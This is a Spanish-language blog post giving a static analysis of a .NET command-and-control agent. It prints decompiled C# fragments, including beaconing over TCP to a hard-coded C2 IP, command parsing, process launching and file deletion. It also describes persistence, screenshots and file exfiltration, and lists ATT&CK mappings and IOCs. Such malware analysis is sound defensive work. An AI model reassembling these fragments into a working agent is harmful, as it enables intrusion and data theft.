+++
title = '004 - Analizando un agente de C2 - Parte 2: el agente'
date = 2023-12-26T12:03:49-05:00
draft = false
translationKey = '004-dotnet-agent'
description = 'En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este.'
+++


*This article is also available in [english](/en/posts/004-analyzing-a-dotnet-c2-agent/)*


## 1. Introducción

En [la primera parte de este artículo](/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/) identificamos que, luego de implemenetar ciertas técnicas para dificultar su detección, la macro maliciosa que analizamos extraía y ejecutaba un binario .exe que tenía embebido. En esta parte, analizaremos dicho binario de manera estática para comprender cómo funciona, cómo identificamos que corresponde a un agente de C2, y qué indicadores de compromiso podemos obtener de este.

Debido a la longitud del artículo, en una tercera parte se evaluará de manera dinámica el binario.

> **Disclaimer**: Ejecutar malware en un dispositivo personal/corporativo puede poner en riesgo tu información/la información de tu empresa. Nunca ejecutes malware en un dispositivo que no ha sido específicamente configurado para el análisis.


## 2. Análisis estático del ejecutable
### 2.1 Identificación de hashes y framework de desarrollo utilizado

Iniciamos el análisis obteniendo el hash del ejecutable:

| Algoritmo | Hash                                                             |
|-----------|------------------------------------------------------------------|
| MD5       | 59211a4e0f27d70c659636746b61945a                                 |
| SHA256    | 2110af4e9c7a4f7a39948cdd696fcd8b 4cdbb7a6a5bf5c5a277b779cc1bf8577 |


Al abrir el binario en [PEStudio](https://www.winitor.com/download), podemos identificar algunas cosas interesantes:

![alt text](/img/004-pestudio1.png "PEStudio Analysis")

1. PEStudio identifica el binario como de tipo "Microsoft .NET"
2. El binario parece haber sido compilado el 05 de Setiembre del 2023, por lo que es reciente. (Dicho valor puede ser alterado por lo que no es 100% confiable)
3. Se identifica la ruta del archivo "debug" del binario, la cual contiene \obj\Debug, directorio estándar creado por Visual Studio.

Dichos factores parecen indicarnos que se trata de un programa .NET; adicionalmente, analizando algunas de las otras secciones de información que ofrece PEStudio podemos obtener mayor confirmación sobre esto:

![alt text](/img/004-pestudio2.png "PEStudio Indicators")

![alt text](/img/004-pestudio3.png "PEStudio Imports")

1. PEStudio identifica el namespace .NET System.Net.Socket
2. PEStudio identifica que el programa, durante su ejecución, importa [clases de .NET](https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0)

Con dicha información, podemos decir con casi total certeza de que el binario corresponde a uno desarrollado con el framework .NET. Adicionalmente, verificamos que PEStudio identifica una IP, que puede ser un indicador de compromiso (IOC) de interés.

### Decompilación de binarios .NET

Los programas desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directamente al lenguaje máquina binario que la computadora entiende (los 0 y 1). En su lugar, se compilan a un lenguaje intermedio conocido como Intermediate Language (IL), el cual es convertido durante la ejecución del programa al lenguaje máquina específico del entorno en el que se está ejecutando.

Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre nombres de clases, métodos, metadata, etc., lo que permite que sea decompilado y así, "revertido" casi a su forma original.

Existen distintas herramientas que permiten decompilar un binario creado en .NET, entre las que se encuentran [_ILSpy_](https://github.com/icsharpcode/ILSpy) y [_dnSpy_](https://github.com/dnSpy/dnSpy); para el presente análisis utilizaré _dnSpy_ debido a las capacidades de debugging que ofrece.

### 2.2 Análisis inicial del binario

Al abrir el ejecutable en _dnSpy_, validamos que efectivamente podemos visualizar el código:

![alt text](/img/004-dnspy.png "dnSpy")

Dado que analizar cada función que llama el ejecutable puede ser muy tedioso (especialmente si contiene código basura destinado a dificultar el análisis), seguiremos el flujo de llamadas que se hacen desde el método Main.

1. Verificamos que cuando el programa se inicia llama al formulario Form1, el cual, al inicializarse, invoca al método **InitializeComponent()**. De la configuración de dicho método podemos destacar tres cosas:
	1. Se configura la opacidad del formulario a 0 para hacer de este invisible.
	2. Se configura para que no tenga un ícono en la barra de tareas.
	3. Se llama al método **Form1_Load**.

```c#
private void InitializeComponent()
		{
            ...
			base.Name = "Form1";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			this.Text = "Form1";
			base.FormClosing += this.Form1_FormClosing;
			base.Load += this.Form1_Load;
            ...

		}
```
2. El método **Form1_Load** detiene la ejecución ("duerme") por unos segundos antes de llamar al método **corediQart()**:

```c#
private void Form1_Load(object sender, EventArgs e)
		{
			try
			{
				Thread.Sleep(1010);
				base.ShowInTaskbar = false;
				base.Visible = false;
				base.FormBorderStyle = FormBorderStyle.SizableToolWindow;
				Thread.Sleep(2050);
				Thread.Sleep(1280);
				this.mainvp.corediQart();
			}
			catch
			{
			}
		}
```
Esta técnica ([T1497.003](https://attack.mitre.org/techniques/T1497/003/)) usualmente es utilizada por atacantes para evadir herramientas de análisis dinámico, muchas de las cuales solo están activas por un corto tiempo y puede que crean que un binario no tiene comportamiento malicioso solo porque aún no es ejecutado. En este caso, desde mi punto de vista, los tiempos son muy cortos para estar utilizando dicha técnica, por lo que probablemente están para dar tiempo a otros componentes del programa de terminar de cargar.

3. El método **corediQart()** realiza las siguientes acciones:
    1. Asigna el primer puerto definido en la variable _ports_ a la variable _port_.
    2. Obtiene el nombre de la computadora donde se está ejecutando, así como el usuario que está ejecutando el programa y lo asigna a la variable _userAiunt_.
    3. Crea un objeto de tipo _TimerCallback_ que llama al método **procvQloop**.
    4. Configura el objeto de tipo _TimerCallback_ para que se ejecute cada 58.51 segundos, luego de esperar inicialmente 49.12 segundos.

```c#
		public void corediQart()
		{
			DIRERRIF.port = DIRERRIF.ports[0];
			this.userAiunt = new MRDFINF();
			...
			TimerCallback callback = new TimerCallback(this.procvQloop);
			Timer timer = new Timer(callback, this.objeAdate, 49120, 58510);
			this.objeAdate.timer = timer;
		}
```
```c#
        public static int[] ports = new int[]
		{
			9149,
			15198,
			17818,
			27781,
			29224
		};
```
```c#
        public MRDFINF()
		{
			...
			this.comtname = SystemInformation.ComputerName;
			this.acc_datQtime = Environment.UserName;
			...
		}

```

4. Analizando lo que hace el método **procvQloop()**, inicia una conexión TCP con la IP almacenada en la variable _min\_codns_; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:

```c#
DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, 0, DIRERRIF.min_codns.Length).ToString();
this.maiedet = new TcpClient();
this.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
```
```c#
public static byte[] min_codns = new byte[]
{49, 54, 50, 46, 50, 52, 53, 46, 49, 57, 49, 46, 50, 49, 55};
```

La conexión TCP se realiza con la IP almacenada en la variable _min\_codns_ en el puerto asignado a la variable _port_.

5. Una vez realizada la conexión, si es exitosa, se llama al método **procD_core()**, el cual realiza múltiples operaciones:
    1. Obtiene una respuesta de la conexión TCP establecida previamente.
    2. Separa la respuesta obtenida utilizando el separador '='.
    3. En base al primer valor de la respuesta (lo que estaba antes del '=') llama a distintos métodos.


```c#
private void procD_core()
        ...
		string[] procss_type = this.get_procsQtype();
		...
		string text = procss_type[0].ToLower();
		...
		if (text == "thyTumb")
		{
			this.imagiQtails(procss_type[1]);
		}
		if (text == "scyTrsz")
		{
			this.dsAscrnsize(procss_type[1]);
		}
		...
```


```c#
public string[] get_procsQtype()
{
	string[] result;
	try
	{
		byte[] array = new byte[5];
		this.byteAdesr = this.newWam.Read(array, 0, 5);
		int num = BitConverter.ToInt32(array, 0);
		byte[] array2 = new byte[num];
		int num2 = 0;
		for (int i = num; i > 0; i -= this.byteAdesr)
		{
			int count = (i > this.bufeAize) ? this.bufeAize : i;
			this.byteAdesr = this.newWam.Read(array2, num2, count);
			num2 += this.byteAdesr;
		}
		string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
		if (text.Trim() == "")
		{
			result = null;
		}
		else
		{
			result = text.Split(new char[]
			{
				'='
			});
		}
	}
	return result;
}
```


Sin analizar el resto de las funciones, el comportamiento del programa ya nos hace suponer que puede ser un agente de C2:

1. Cada cierto tiempo (aproximadamente cada minuto), se comunica con un servidor basado en una IP y un puerto no común.
2. Recibe respuesta del servidor, la cual se compone de dos secciones.
3. En base a la primera sección (comandos), llama a métodos pasándoles la segunda sección (payload/parámetros del comando).

En base a dicho análisis podemos asumir que el servidor envía comandos al agente, el cual los ejecuta. Posterior análisis nos permitirá confirmar si realmente es un agente de Comando y Control, así como las capacidades que tiene este agente.


### 2.3 Análisis de los métodos del agente de C2

Debido a que analizar cada función sería muy tedioso, analizaremos algunas funciones que me parecieron interesantes:


#### 2.3.1 Listar procesos

Al igual que en la macro que contenía el binario, se visualiza el uso de subguiones para separar comandos/variables:

![alt text](/img/004-lp1.png "Obfuscation")

Al recibir el comando "geyTtavs", se obtienen los procesos que se están ejecutando en el sistema y se envía el ID y nombre de estos mediante la función **loadQData**:

![alt text](/img/004-lp2.png "List Processes")

La función **loadQData** envía el tipo de respuesta a esperar, el tamaño de esta y la respuesta al servidor.

Con solo analizar la función de listar procesos, podemos confirmar que es un agente de Comando y Control: el programa se contacta a un servidor, recibe una instrucción (listar procesos en este caso) y envía la respuesta al servidor.


#### 2.3.2 Establecer persistencia

La llave de registro _HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run_ es usualmente abusada por atacantes para establecer persistencia; dicha técnica está [catalogada en MITRE ATT&CK con ID T1547.001](https://attack.mitre.org/techniques/T1547/001/) y [permite a un atacante ejecutar un programa cuando el usuario inicia sesión](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys), bajo el contexto (permisos) de ese usuario.

Verificamos que el agente ofrece la capacidad de establecer persistencia, al recibir el comando "puyTtsrt" crea la llave de registro con nombre "haijwivetsgVr":

![alt text](/img/004-pers1.png "Establish persistence 1")

![alt text](/img/004-pers2.png "Establish persistence 2")

![alt text](/img/004-pers3.png "Establish persistence 3")

Al igual que antes, vemos que el nombre de la ruta en el registro ha sido dividido utilizando subguiones para dificultar su identificación.


#### 2.3.3 Listar archivos

Al recibir el comando "flyTes" junto con una ruta, el comando lista los archivos de la ruta utilizando el método **Directory.GetFiles**, los concatena utilizando el caracter '>' como separador y los envía al servidor:

![alt text](/img/004-listfiles.png "Listing files")

![alt text](/img/004-listfiles2.png "Read directory")


#### 2.3.4 Sacar capturas de pantalla

Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sacar capturas de pantalla y enviarlas al servidor:

![alt text](/img/004-sc1.png "Screen capture 1")

![alt text](/img/004-sc2.png "Screen capture 2")

![alt text](/img/004-sc3.png "Screen capture 3")


#### 2.3.5 Exfiltración de archivos

El comando "afyTile" puede ser utilizado para exfiltrar un archivo de la máquina víctima al servidor; para ello, recibe como parámetro la ruta del archivo a exfiltrar:

![alt text](/img/004-exfilb.png "File exfiltration")

![alt text](/img/004-exfila.png "File exfiltration 2")

La información devuelta al servidor incluye la ruta del archivo, el nombre del archivo y el contenido de este.


#### 2.3.6 Ejecutar binarios

Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se utiliza  el comando "ruyTnf", el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar.

```C#
if (text == "ruyTnf") {
  ..
    Process.Start(procss_type[1].Split(new char[] { '>' })[0]);
  } catch {
  }
}
```


#### 2.3.7 Eliminar un archivo

El comando "deyTlt" recibe como parámetro la ruta donde está almacenado un archivo, para posteriormente utilizar el método **File.Delete** para eliminarlo:

```C#
if (text == "deyTlt") {
  this.trasQfiles(procss_type[1]);
}

public void trasQfiles(string path) {
  try {
    File.Delete(path);
  } catch {
  }
}
```


## 3. Conclusiones

Cuando comencé a escribir este artículo creí que sería la parte final del análisis; sin embargo, luego de identificar la cantidad de funciones que el agente exponía, preferí entrar a detalle en algunas y dejar el análisis dinámico para el siguiente artículo.

El malware analizado tiene todas las características de un agente de Comando y Control: se contacta con el servidor cada cierto tiempo, permite obtener información del sistema, permite exfiltrar información, permite descargar binarios al sistema y ejecutarlos, entre otras funciones.

El malware utiliza un par de técnicas para evalidar herramientas de análisis de código estático: uso de subguiones para alterar nombres de variables/llaves de registro, así como el uso de un arreglo de bytes para almacenar una IP en vez de almacenarla en plano; aún así, el que haya sido desarrollado en .NET permite su fácil decompilación y análisis.

En el próximo artículo detallaré como alguien puede interactuar con el malware como parte de su análisis, y así evidenciar si tiene alǵun comportamiento no identificado como parte del análisis estático.

## 4. Mapeo MITRE ATT&CK

| ID        | Táctica             | Técnica                                                               | Descripción                                                                                                                                |
|-----------|---------------------|-----------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------|
| T1059.003 | Ejecución           | Command and Scripting Interpreter: Windows Command Shell              | Se utilizó el método Process.Start para iniciar nuevos procesos                                                                            |
| T1547.001 | Persistencia        | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Se utilizó una llave de registro para establecer persistencia |
| T1070.004 | Evasión de defensas | Indicator Removal: File Deletion                                      | El agente tiene la capacidad de eliminar archivos                                                                                          |
| T1057     | Descubrimiento      | Process Discovery                                                     | El agente tiene la capacidad de listar procesos                                                                                            |
| T1082     | Descubrimiento      | System Information Discovery                                          | El agente tiene la capacidad de obtener información del sistema                                                                            |
| T1027.010 | Evasión de defensas | Obfuscated Files or Information: Command Obfuscation                  | Se utilizó el reemplazo de caracteres para ofuscar comandos                                                                                |
| T1113     | Colección           | Screen Capture                                                        | El agente tiene la capacidad de sacar capturas de pantalla                                                                                 |
| T1005     | Colección           | Data from Local System                                                | El agente tiene la capacidad de obtener información de archivos del sistema                                                                |
| T1571     | Comando y Control   | Non-Standard Port                                                     | El agente no utiliza puertos comunes para comunicarse con el servidor de C2                                                                |
| T1095     | Comando y Control   | Non-Application Layer Protocol                                        | El agente se comunica mediante TCP, interactuando directo con el flujo de datos                                                            |
| T1041     | Comando y Control   | Exfiltration Over C2 Channel                                          | El agente exfiltra información utilizando la conexión establecida con el servidor de C2                                                    |

## 5. IOC

| IOC                                                                           | Tipo              | Descripción                                              |
|-------------------------------------------------------------------------------|-------------------|----------------------------------------------------------|
| 59211a4e0f27d70 c659636746b61945a                                              | Hash MD5          | Hash del agente de C2                                    |
| 162.245.191.217                                                               | IP                | IP a donde se comunica el agente                         |
| HKEY_CURRENT_USER\ Software\Microsoft \Windows\CurrentVersion\ Run\haijwivetsgVr | Llave de registro | Llave que el agente utiliza para establecer persistencia |